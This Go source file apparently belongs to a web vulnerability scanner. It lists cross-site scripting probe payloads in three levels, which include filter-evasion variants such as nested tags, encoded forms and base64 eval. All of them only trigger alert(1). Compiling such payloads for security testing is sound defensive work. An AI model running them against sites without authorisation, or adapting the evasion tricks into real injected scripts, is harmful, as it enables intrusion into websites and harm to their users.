package payloads

// XSSPayloads contains XSS payloads organized by level
// Level 1 = Basic, Level 2 = Normal, Level 3 = Aggressive
var XSSPayloads = map[int][]string{
	1: { // Basic
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
	},
	2: { // Normal
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
	},
	3: { // Aggressive
		"<script>alert(1)</script>",
		"<img src=x onerror=alert(1)>",
		"<svg onload=alert(1)>",
		"'\"><script>alert(1)</script>",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"javascript:alert(1)",
		"<img src=\"x\" onerror=\"alert(1)\">",
		"'-alert(1)-'",
		"\"-alert(1)-\"",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<img/src=x onerror=alert(1)>",
		"<svg/onload=alert(1)>",
		"<<script>script>alert(1)<</script>/script>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<img src=x:alert(alt) onerror=eval(src) alt=1>",
		"<svg><script>alert(1)</script></svg>",
		"%3Cscript%3Ealert(1)%3C/script%3E",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"<script>eval(atob('YWxlcnQoMSk='))</script>",
	},
}

// GetXSSPayloads returns XSS payloads for the given level
func GetXSSPayloads(level int) []string {
	if p, ok := XSSPayloads[level]; ok {
		return p
	}
	return XSSPayloads[2] // Default to normal
}
